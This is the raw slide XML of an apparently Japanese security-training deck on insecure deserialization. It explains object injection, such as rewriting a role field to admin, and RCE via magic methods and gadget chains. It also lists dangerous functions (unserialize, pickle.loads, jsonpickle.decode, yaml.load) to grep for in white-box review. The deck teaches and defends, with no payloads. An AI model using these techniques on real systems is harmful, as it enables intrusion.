            <a:ext cx="4748403"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>オブジェクトインジェクション</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Text 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1098550" y="2553891"/>
            <a:ext cx="4748403" cy="517525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1938"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>シリアライズされたデータを改ざんし、デシリアライズ時にサーバーが意図しない「状態」を受け取るようにする</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Text 5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1098550" y="3173016"/>
            <a:ext cx="4610100" cy="586581"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10825"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="EAF1FC"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="95701" tIns="70301" rIns="0" bIns="44901" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1610"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="3E6FBD"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>例：ロール／権限フィールドを管理者に書き換える、メールアドレスのドメイン制限を回避する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Shape 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6200775" y="1562695"/>
            <a:ext cx="5175250" cy="3783409"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2937"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln w="6350">
            <a:solidFill>
              <a:srgbClr val="E2E0D9"/>
            </a:solidFill>
            <a:prstDash val="solid"/>
          </a:ln>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Text 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483350" y="1845270"/>
            <a:ext cx="4748403" cy="220960"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1540"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1100" b="1" spc="100" kern="0" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="E08A3C"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>REMOTE CODE EXECUTION</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1100" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Text 8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483350" y="2167830"/>
            <a:ext cx="4748403"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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>リモートコード実行</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1700" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Text 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483350" y="2553891"/>
            <a:ext cx="4748403" cy="517525"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1938"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1250" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="4A5058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>デシリアライズされると、サーバー側でコマンド実行につながるようなペイロードを供給する</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1250" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Text 10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6483350" y="3173016"/>
            <a:ext cx="4610100" cy="586581"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 10825"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFF4E8"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="95701" tIns="70301" rIns="0" bIns="44901" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="l" indent="0" marL="0">
              <a:lnSpc>
                <a:spcPts val="1610"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1150" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="8A4B15"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>例：マジックメソッド（__wakeup等）経由のコマンドインジェクション、ガジェットチェーン</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1150" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13" name="Text 11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="56286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179"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>RCE以外にも、SQLi・LFI・DoSなどに発展する場合がある（本資料後半で扱う）</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6F2"/>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A1D21"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>特定：ホワイトボックス</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Text 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="1534120"/>
            <a:ext cx="10883392"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058"/>
                </a:solidFill>
                <a:latin typeface="IBM Plex Sans" pitchFamily="34" charset="0"/>
                <a:ea typeface="IBM Plex Sans" pitchFamily="34" charset="-122"/>
                <a:cs typeface="IBM Plex Sans" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>ソースコードがあれば、危険な関数呼び出しを grep するだけで高速に特定できる</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1300" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Shape 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2019201"/>
            <a:ext cx="10566400" cy="2893219"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 2634"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FFFFFF"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Shape 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2019201"/>
            <a:ext cx="10566400" cy="2893219"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="2893219">
                <a:moveTo>
                  <a:pt x="10490200" y="0"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="2817019"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="0" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="2893219"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="2817019"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="76200" stAng="10800000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="2886869"/>
                </a:lnTo>
                <a:arcTo hR="69850" wR="69850" stAng="5400000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="10560050" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="69850" stAng="0" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="E2E0D9"/>
          </a:solidFill>
          <a:ln/>
        </p:spPr>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Shape 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="812800" y="2019201"/>
            <a:ext cx="10566400" cy="2893219"/>
          </a:xfrm>
          <a:custGeom>
            <a:avLst/>
            <a:gdLst/>
            <a:ahLst/>
            <a:cxnLst/>
            <a:rect l="l" t="t" r="r" b="b"/>
            <a:pathLst>
              <a:path w="10566400" h="2893219">
                <a:moveTo>
                  <a:pt x="76200" y="2893219"/>
                </a:moveTo>
                <a:lnTo>
                  <a:pt x="76200" y="2893219"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="5400000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="0" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="10800000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10490200" y="0"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="76200" stAng="16200000" swAng="5400000"/>
                <a:lnTo>
                  <a:pt x="10566400" y="76200"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="76200" stAng="0" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="76200" y="12700"/>
                </a:lnTo>
                <a:arcTo hR="63500" wR="63500" stAng="16200000" swAng="-5400000"/>
                <a:lnTo>
                  <a:pt x="12700" y="2817019"/>
                </a:lnTo>
                <a:arcTo hR="76200" wR="63500" stAng="10800000" swAng="-5400000"/>
                <a:close/>
              </a:path>
            </a:pathLst>
          </a:custGeom>
          <a:solidFill>
            <a:srgbClr val="141413">
              <a:alpha val="22000"/>
            </a:srgbClr>
          </a:solidFill>
          <a:ln/>
        </p:spPr>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825500" y="2031901"/>
          <a:ext cx="10547350" cy="2874169"/>
        </p:xfrm>
        <a:graphic>
          <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/table">
            <a:tbl>
              <a:tblPr/>
              <a:tblGrid>
                <a:gridCol w="4746308"/>
                <a:gridCol w="5801043"/>
              </a:tblGrid>
              <a:tr h="359271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>危険な関数</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" b="1" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="ECEAE4"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>言語 / ライブラリ</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnT>
                    <a:lnB w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="14171A"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="359271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>unserialize()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnR>
                    <a:lnT w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="141618"/>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1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>PHP</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono"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41618"/>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59271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>pickle.loads()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Python Pickle</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785"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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
              </a:tr>
              <a:tr h="359271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>jsonpickle.decode()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="CBCBCB"/>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1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Python JSONPickle</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono"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59271">
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>yaml.load()</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
                  </a:txBody>
                  <a:tcPr marL="57785" marR="57785" marT="57785" marB="57785" anchor="t">
                    <a:lnL w="0" cap="flat" cmpd="sng" algn="ctr">
                      <a:noFill/>
                    </a:lnL>
                    <a:lnR w="12700" cap="flat" cmpd="sng" algn="ctr">
                      <a:solidFill>
                        <a:srgbClr val="C5C4C1"/>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5C4C1"/>
                      </a:solidFill>
                      <a:prstDash val="solid"/>
                      <a:round/>
                      <a:headEnd type="none" w="med" len="med"/>
                      <a:tailEnd type="none" w="med" len="med"/>
                    </a:lnB>
                    <a:solidFill>
                      <a:srgbClr val="F7F6F2"/>
                    </a:solidFill>
                  </a:tcPr>
                </a:tc>
                <a:tc>
                  <a:txBody>
                    <a:bodyPr/>
                    <a:lstStyle/>
                    <a:p>
                      <a:pPr indent="0" marL="0">
                        <a:lnSpc>
                          <a:spcPts val="1820"/>
                        </a:lnSpc>
                        <a:buNone/>
                      </a:pPr>
                      <a:r>
                        <a:rPr lang="en-US" sz="1300" dirty="0">
                          <a:solidFill>
                            <a:srgbClr val="1A1D21"/>
                          </a:solidFill>
                          <a:latin typeface="JetBrains Mono" pitchFamily="49" charset="0"/>
                          <a:ea typeface="JetBrains Mono" pitchFamily="49" charset="-122"/>
                          <a:cs typeface="JetBrains Mono" pitchFamily="49" charset="-120"/>
                        </a:rPr>
                        <a:t>Python PyYAML / ruamel.yaml</a:t>
                      </a:r>
                      <a:endParaRPr lang="en-US" sz="1300" dirty="0">
                        <a:latin typeface="JetBrains Mono" charset="0"/>
                        <a:ea typeface="JetBrains Mono" charset="0"/>
                        <a:cs typeface="JetBrains Mono" charset="0"/>
                      </a:endParaRPr>
                    </a:p>
